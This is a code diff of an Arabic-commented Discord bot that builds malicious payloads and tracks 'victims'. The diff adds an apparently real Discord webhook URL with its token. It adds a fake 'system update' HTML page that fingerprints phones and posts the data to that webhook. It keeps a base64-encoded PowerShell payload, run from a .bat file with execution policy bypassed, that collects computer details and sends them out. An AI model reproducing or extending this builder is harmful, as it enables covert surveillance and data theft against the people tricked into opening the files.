@@ -4,7 +4,7 @@ const path = require('path');
 
 // --- إعدادات البوت ---
 const TOKEN = 'ضع_التوكن_هنا'; // ضع توكن البوت هنا
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/ID_TOKEN'; // ويب هوك لاستلام البيانات من الضحايا
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1574869870695157880/jDx4MINBoVjFp9Yr7_ulaIwuKPTZPIGAdXiQzPNUF8vf5WdhOvtMDx5InPhZXMGiBApP'; // ويب هوك لاستقبال البيانات من الضحايا
 
 const client = new Client({
     intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
@@ -29,11 +29,19 @@ client.on('messageCreate', async (message) => {
     
     switch(command) {
         case '!gen':
-            generatePayload(message);
+            generatePayload(message, args[1]);
             break;
             
         case '!list':
             listVictims(message);
+            break;
+            
+        case '!clear':
+            clearVictims(message);
+            break;
+            
+        case '!stats':
+            showStats(message);
             break;
             
         case '!help':
@@ -41,8 +49,6 @@ client.on('messageCreate', async (message) => {
             break;
             
         default:
-            // استقبال البيانات من الويب هوك (إذا كان البوت يستقبلها عبر API خارجي)
-            // أو يمكنك استخدام أمر !scan لإرسال معلومات وهمية للتجربة
             if (command === '!scan') {
                 scanSimulation(message);
             }
@@ -50,10 +56,61 @@ client.on('messageCreate', async (message) => {
 });
 
 // دالة توليد ملف التلغيم (Payload)
-async function generatePayload(message) {
+async function generatePayload(message, type = 'pc') {
     try {
-        // كود PowerShell الذي سيقوم بجمع المعلومات وإرسالها للويب هوك
-        const payloadCode = `
+        let payloadCode = '';
+        let fileName = '';
+        let description = '';
+
+        if (type === 'mobile' || type === 'mob') {
+            // كود HTML + JavaScript للجوال
+            payloadCode = `
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث النظام</title>
+    <style>
+        body { background-color: #e9ecef; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; width: 80%; max-width: 300px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { color: #666; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h3>جاري التحديث...</h3>
+        <div class="spinner"></div>
+        <p>يرجى الانتظار</p>
+    </div>
+    <script>
+        async function sendInfo() {
+            const ua = navigator.userAgent;
+            const info = {
+                "UserAgent": ua,
+                "Screen": screen.width + "x" + screen.height,
+                "Language": navigator.language,
+                "Platform": navigator.platform,
+                "Time": new Date().toISOString()
+            };
+            
+            fetch('${WEBHOOK_URL}', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: "📱 **ضحية جوال جديدة!**", embeds: [{ title: "معلومات الجهاز", description: \`**المستخدم**: \${ua}\n**الشاشة**: \${info.Screen}\n**اللغة**: \${info.Language}\` }] })
+            });
+        }
+        sendInfo();
+    </script>
+</body>
+</html>`;
+            fileName = `mobile_payload_${Date.now()}.html`;
+            description = 'تم توليد ملف الجوال. أرسل الملف للضحية ليتم فتحه في متصفحهم.';
+        } else {
+            // كود PowerShell للكمبيوتر
+            payloadCode = `
 $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem
 $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
 $cpuInfo = Get-CimInstance -ClassName Win32_Processor
@@ -71,45 +128,85 @@ $payload = @{
 
 $jsonPayload = ConvertTo-Json $payload
 
-# إرسال البيانات إلى الويب هوك الخاص بالبوت
 Invoke-RestMethod -Uri "${WEBHOOK_URL}" -Method Post -Body $jsonPayload -ContentType "application/json"
 `;
+            const utf8Bytes = Buffer.from(payloadCode);
+            const base64Payload = utf8Bytes.toString('base64');
+            payloadCode = `powershell.exe -ExecutionPolicy Bypass -EncodedCommand ${base64Payload}`;
+            fileName = `payload_${Date.now()}.bat`;
+            description = 'تم توليد ملف الكمبيوتر. انقل الملف للضحية وافتحه.';
+        }
 
-        // تحويل الكود إلى Base64 لتجنب مشاكل المسافات والعلامات
-        const utf8Bytes = Buffer.from(payloadCode);
-        const base64Payload = utf8Bytes.toString('base64');
-
-        // إنشاء ملف .bat بسيط لتشغيل الكود
-        const batContent = `powershell.exe -ExecutionPolicy Bypass -EncodedCommand ${base64Payload}`;
-        
-        // حفظ الملف محلياً
-        const fileName = `payload_${Date.now()}.bat`;
         const filePath = path.join(__dirname, fileName);
-        fs.writeFileSync(filePath, batContent, 'utf8');
+        fs.writeFileSync(filePath, payloadCode, 'utf8');
 
-        // إرسال الملف للمستخدم
         const embed = new EmbedBuilder()
-            .setTitle('📦 ملف التلغيم جاهز')
-            .setDescription('تم توليد الملف بنجاح. اضغط على الرابط أدناه لتحميله:')
+            .setTitle(type === 'mobile' ? '📱 ملف الجوال جاهز' : '💻 ملف الكمبيوتر جاهز')
+            .setDescription(description)
             .setColor('#00ff00')
             .setFooter({ text: 'انقل الملف للضحية وافتحه' });
 
-        // نحتاج لرابط مباشر للملف، إذا كنت تستخدم استضافة مثل GitHub Pages أو سيرفر خاص
-        // هنا سنفترض أنك سترفع الملف يدوياً أو نرسله كملف مرفق
-        await message.channel.send({ 
-            content: 'إليك ملف التلغيم:', 
-            files: [{ attachment: filePath, name: fileName }] 
-        });
+        await message.channel.send({ embeds: [embed], files: [{ attachment: filePath, name: fileName }] });
 
-        // حذف الملف بعد الإرسال لتنظيف السيرفر
         setTimeout(() => {
             fs.unlinkSync(filePath);
-        }, 60000); // يحذف بعد دقيقة
+        }, 60000);
 
     } catch (error) {
         console.error(error);
         message.reply('❌ حدث خطأ أثناء توليد الملف.');
     }
+}
+
+// عرض قائمة الضحايا
+function listVictims(message) {
+    if (victims.length === 0) {
+        return message.channel.send('لا توجد ضحايا حالياً.');
+    }
+    
+    const embed = new EmbedBuilder()
+        .setTitle('📋 قائمة الضحايا')
+        .setDescription(victims.map((v, i) => `${i+1}. **${v.hostname || v.UserAgent || 'غير معروف'}** (${v.ip || v.Screen || 'N/A'})`).join('\n'))
+        .setColor('#ffff00');
+        
+    message.channel.send({ embeds: [embed] });
+}
+
+// مسح جميع الضحايا
+function clearVictims(message) {
+    victims = [];
+    message.channel.send('✅ تم مسح جميع الضحايا.');
+}
+
+// إحصائيات
+function showStats(message) {
+    const embed = new EmbedBuilder()
+        .setTitle('📊 الإحصائيات')
+        .addFields(
+            { name: 'عدد الضحايا', value: victims.length.toString(), inline: true },
+            { name: 'الوقت', value: new Date().toLocaleString(), inline: true },
+            { name: 'الحالة', value: '✅ نشط', inline: true }
+        )
+        .setColor('#00aaff');
+        
+    message.channel.send({ embeds: [embed] });
+}
+
+// مساعدة
+function showHelp(message) {
+    const embed = new EmbedBuilder()
+        .setTitle('❓ الأوامر المتاحة')
+        .setDescription(`
+**!gen pc** - توليد ملف الكمبيوتر
+**!gen mobile** - توليد ملف الجوال
+**!list** - عرض قائمة الضحايا
+**!clear** - مسح جميع الضحايا
+**!stats** - عرض الإحصائيات
+**!help** - عرض المساعدة
+        `)
+        .setColor('#00aaff');
+        
+    message.channel.send({ embeds: [embed] });
 }
 
 // محاكاة فحص الجهاز
@@ -124,32 +221,6 @@ function scanSimulation(message) {
         )
         .setColor('#00ff00');
     
-    message.channel.send({ embeds: [embed] });
-}
-
-function listVictims(message) {
-    if (victims.length === 0) {
-        return message.channel.send('لا توجد ضحايا حالياً.');
-    }
-    
-    const embed = new EmbedBuilder()
-        .setTitle('📋 قائمة الضحايا')
-        .setDescription(victims.map((v, i) => `${i+1}. **${v.hostname}** (${v.ip})`).join('\n'))
-        .setColor('#ffff00');
-        
-    message.channel.send({ embeds: [embed] });
-}
-
-function showHelp(message) {
-    const embed = new EmbedBuilder()
-        .setTitle('❓ الأوامر المتاحة')
-        .setDescription(`
-**!gen** - توليد ملف التلغيم (Payload)
-**!list** - عرض قائمة الضحايا
-**!scan** - محاكاة فحص جهاز
-        `)
-        .setColor('#00aaff');
-        
     message.channel.send({ embeds: [embed] });
 }
 
